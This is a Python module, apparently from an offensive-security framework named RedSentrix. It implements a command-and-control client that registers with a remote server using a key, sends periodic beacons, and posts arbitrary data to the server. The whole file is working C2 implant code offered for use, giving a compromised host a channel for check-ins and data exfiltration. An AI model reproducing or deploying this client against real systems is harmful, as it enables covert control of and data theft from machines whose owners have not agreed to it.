"""
C2 (Command and Control) client for RedSentrix
"""

import requests
import time
import json
from typing import Optional, Dict, Any

from .logger import Logger


class C2Client:
    """C2 communication client"""
    
    def __init__(self, url: str, key: str):
        self.url = url
        self.key = key
        self.logger = Logger()
        self.session = requests.Session()
        self.connected = False
    
    def connect(self) -> bool:
        """Connect to C2 server"""
        try:
            response = self.session.post(
                f"{self.url}/register",
                json={"key": self.key},
                timeout=10
            )
            if response.status_code == 200:
                self.connected = True
                self.logger.log("Connected to C2 server", "info")
                return True
            return False
        except Exception as e:
            self.logger.log(f"C2 connection error: {e}", "error")
            return False
    
    def beacon(self) -> Optional[Dict[str, Any]]:
        """Send beacon to C2 server"""
        if not self.connected:
            return None
        
        try:
            response = self.session.post(
                f"{self.url}/beacon",
                json={"status": "alive"},
                timeout=10
            )
            if response.status_code == 200:
                return response.json()
            return None
        except Exception as e:
            self.logger.log(f"Beacon error: {e}", "error")
            return None
    
    def send_data(self, data: Dict[str, Any]) -> bool:
        """Send data to C2 server"""
        if not self.connected:
            return False
        
        try:
            response = self.session.post(
                f"{self.url}/data",
                json=data,
                timeout=10
            )
            return response.status_code == 200
        except Exception as e:
            self.logger.log(f"Send data error: {e}", "error")
            return False
    
    def disconnect(self):
        """Disconnect from C2 server"""
        if self.connected:
            try:
                self.session.post(f"{self.url}/disconnect", timeout=5)
            except:
                pass
            self.connected = False

